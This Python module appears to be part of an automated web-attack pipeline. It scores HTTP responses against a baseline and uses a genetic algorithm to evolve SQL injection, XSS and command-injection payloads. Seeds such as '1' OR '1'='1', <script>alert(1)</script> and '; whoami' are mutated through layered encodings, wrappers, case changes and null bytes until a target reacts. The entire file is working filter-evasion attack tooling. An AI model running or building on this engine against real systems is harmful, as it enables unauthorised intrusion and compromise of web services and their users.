"""
Payload genetic engine: evolve novel payloads beyond static templates.
Includes differential analyzer for behavioral analysis and PayloadGene structures.
"""

import asyncio
import random
import time
from dataclasses import dataclass
from typing import Callable, Optional, Tuple

import requests

from modules.pipeline.utils.logger import logger


@dataclass
class DeltaVector:
    """Represents response behavior delta compared to baseline."""
    time_delta_ms: int
    status_code_change: str
    body_length_delta: int
    reflection_present: bool
    error_class: str
    new_headers: list
    oob_triggered: bool

    @property
    def fitness_score(self) -> float:
        score = 0.0
        if self.oob_triggered:
            score += 0.50
        if self.time_delta_ms > 2000:
            score += 0.25
        if self.error_class != "none":
            score += 0.10
        if self.reflection_present:
            score += 0.08
        if self.status_code_change:
            score += 0.05
        if self.body_length_delta > 200:
            score += 0.02
        return min(1.0, score)


class DifferentialAnalyzer:
    """Analyzes HTTP response deltas to identify vulnerability indicators."""

    @staticmethod
    def analyze(baseline_response: requests.Response, probe_response: requests.Response, oob_triggered: bool = False) -> DeltaVector:
        """Compute fitness score for a probe response compared to baseline."""
        baseline_time = baseline_response.elapsed.total_seconds() * 1000
        probe_time = probe_response.elapsed.total_seconds() * 1000
        time_delta = int(probe_time - baseline_time)

        status_change = ""
        if baseline_response.status_code != probe_response.status_code:
            status_change = f"{baseline_response.status_code}→{probe_response.status_code}"

        baseline_len = len(baseline_response.text or "")
        probe_len = len(probe_response.text or "")
        body_delta = probe_len - baseline_len

        probe_text = (probe_response.text or "").lower()
        reflection = any(marker in probe_text for marker in ["error", "exception", "syntax", "payload"])

        error_class = "none"
        if "error" in probe_text:
            error_class = "error"
        if any(s in probe_text for s in ["timeout", "timed out", "deadlock"]):
            error_class = "timeout"

        new_headers = [h for h in probe_response.headers.keys() if h not in baseline_response.headers]

        return DeltaVector(
            time_delta_ms=time_delta,
            status_code_change=status_change,
            body_length_delta=body_delta,
            reflection_present=reflection,
            error_class=error_class,
            new_headers=new_headers,
            oob_triggered=oob_triggered,
        )


@dataclass
class PayloadGene:
    """Structured payload representation with encoding and wrapper layers."""
    vuln_class: str
    core_payload: str
    encoding_layer: str = "none"
    delimiter: str = ""
    wrapper: str = "none"
    null_byte: bool = False
    case_variant: str = "none"

    def render(self) -> str:
        """Render final injection string with all transformations applied."""
        payload = self.core_payload

        # Apply case variant
        if self.case_variant == "upper":
            payload = payload.upper()
        elif self.case_variant == "lower":
            payload = payload.lower()
        elif self.case_variant == "mixed":
            payload = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

        # Apply encoding
        if self.encoding_layer == "url":
            import urllib.parse
            payload = urllib.parse.quote(payload)
        elif self.encoding_layer == "double_url":
            import urllib.parse
            payload = urllib.parse.quote(urllib.parse.quote(payload))
        elif self.encoding_layer == "html_entity":
            payload = "".join(f"&#{ord(c)};" for c in payload)
        elif self.encoding_layer == "hex":
            payload = "".join(f"\\x{ord(c):02x}" for c in payload)

        # Apply delimiter
        if self.delimiter:
            payload = self.delimiter + payload + self.delimiter

        # Apply wrapper
        if self.wrapper == "json":
            import json
            payload = json.dumps(payload)
        elif self.wrapper == "xml":
            payload = f"<![CDATA[{payload}]]>"
        elif self.wrapper == "base64":
            import base64
            payload = base64.b64encode(payload.encode()).decode()

        # Null byte
        if self.null_byte:
            payload = payload + "\x00"

        return payload


class PayloadGeneticEngine:
    """Evolve payloads via mutation/crossover when standard payloads fail."""

    POPULATION_SIZE = 15
    MAX_GENERATIONS = 8
    SELECTION_TOP_K = 5

    def __init__(self):
        self.base_payloads = {
            "SQLI": ["1'--", "1' OR '1'='1", "1\" OR \"1\"=\"1"],
            "XSS": ["<script>alert(1)</script>", "\"><script>alert(1)</script>"],
            "CMDI": ["; whoami", "| id", "& whoami"],
        }

    def evolve(
        self,
        vuln_class: str,
        target_url: str,
        param_name: str,
        evaluator: Callable[[str], DeltaVector],
        baseline_response: requests.Response,
        remaining_budget_seconds: float,
    ) -> Tuple[Optional[str], float]:
        """Evolve payloads for remaining_budget_seconds."""
        start_time = time.time()
        best_payload = None
        best_score = 0.0

        # Initialize population from seed payloads
        base = self.base_payloads.get(vuln_class, ["test"])
        population = [
            PayloadGene(
                vuln_class=vuln_class,
                core_payload=random.choice(base),
                encoding_layer=random.choice(["none", "url", "html_entity", "hex"]),
                delimiter=random.choice(["", "'", '"']),
            )
            for _ in range(self.POPULATION_SIZE)
        ]

        for generation in range(self.MAX_GENERATIONS):
            # Evaluate population
            scores = []
            for gene in population:
                payload = gene.render()
                delta = evaluator(payload)
                fitness = delta.fitness_score
                scores.append((fitness, gene))
                if fitness >= 0.95:
                    return (payload, fitness)
                if fitness > best_score:
                    best_score = fitness
                    best_payload = payload

            # Check time budget
            elapsed = time.time() - start_time
            if elapsed > remaining_budget_seconds - 5:
                break

            # Selection
            scores.sort(reverse=True)
            survivors = [gene for _, gene in scores[: self.SELECTION_TOP_K]]

            # Crossover + mutation
            offspring = []
            while len(offspring) < self.POPULATION_SIZE:
                if len(survivors) >= 2:
                    p1, p2 = random.sample(survivors, 2)
                    child = PayloadGene(
                        vuln_class=vuln_class,
                        core_payload=random.choice([p1.core_payload, p2.core_payload]),
                        encoding_layer=random.choice([p1.encoding_layer, p2.encoding_layer]),
                        delimiter=random.choice([p1.delimiter, p2.delimiter]),
                    )
                else:
                    child = survivors[0]

                # Mutation
                if random.random() > 0.5:
                    child.encoding_layer = random.choice(["none", "url", "html_entity", "hex"])
                if random.random() > 0.7:
                    child.null_byte = not child.null_byte

                offspring.append(child)

            population = offspring

        return (best_payload, best_score)
